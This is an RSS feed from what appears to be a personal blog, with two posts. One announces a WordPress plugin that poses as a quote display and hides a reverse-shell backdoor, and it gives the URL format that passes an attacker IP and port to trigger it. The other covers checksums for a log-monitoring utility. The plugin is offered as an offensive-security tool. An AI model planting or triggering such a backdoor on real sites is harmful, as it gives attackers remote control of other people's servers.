@@ -1,0 +1,38 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Open Source on Hi, I&#39;m Kyle</title>
+    <link>https://jovial-yonath-8d9e17.netlify.app/categories/open-source/</link>
+    <description>Recent content in Open Source on Hi, I&#39;m Kyle</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Tue, 07 May 2019 01:33:19 +0000</lastBuildDate>
+    
+	<atom:link href="https://jovial-yonath-8d9e17.netlify.app/categories/open-source/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    <item>
+      <title>Conwell Quotes v1.1</title>
+      <link>https://jovial-yonath-8d9e17.netlify.app/2019/05/07/conwell-quotes-v1-1/</link>
+      <pubDate>Tue, 07 May 2019 01:33:19 +0000</pubDate>
+      
+      <guid>https://jovial-yonath-8d9e17.netlify.app/2019/05/07/conwell-quotes-v1-1/</guid>
+      <description>Conwell Quotes is a malicious WordPress plugin that hides a reverse shell in a backdoor behind legitimate plugin functionality. This is used for offensive security purposes.
+This is an update to version 1.1. This update now allows you to pass your ip and port as URL parameters rather than updating the error.php file prior to upload.
+http://example.com/wp-content/plugins/conwell/error.php?ip=XX.XXX.XXX.X&amp;amp;port=XXXX
+You can find the open source code on GitHub.
+Modeled after the Hello Dolly plugin which comes packaged on all new WordPress installations, Conwell Quotes displays a random quote on each page of the WordPress admin portal based on Conwell&amp;rsquo;s Acres of Diamonds (which is one of my favorite books).</description>
+    </item>
+    
+    <item>
+      <title>SHA-256 checksums for LogWatcher</title>
+      <link>https://jovial-yonath-8d9e17.netlify.app/2018/12/07/sha-256-checksums-for-logwatcher/</link>
+      <pubDate>Fri, 07 Dec 2018 20:14:48 +0000</pubDate>
+      
+      <guid>https://jovial-yonath-8d9e17.netlify.app/2018/12/07/sha-256-checksums-for-logwatcher/</guid>
+      <description>The more I was thinking about it, since LogWatcher is a server utility and may occasionally be run with escalated privileges, I thought it would be wise to publish checksums for integrity.
+LogWatcher is a utility to perform very simple automated system monitoring and alerting. It is an ideal solution to use in conjunction with a web app that has a sound event logging architecture implemented. LogWatcher simply watches an error log file for any anomalous behavior.</description>
+    </item>
+    
+  </channel>
+</rss>
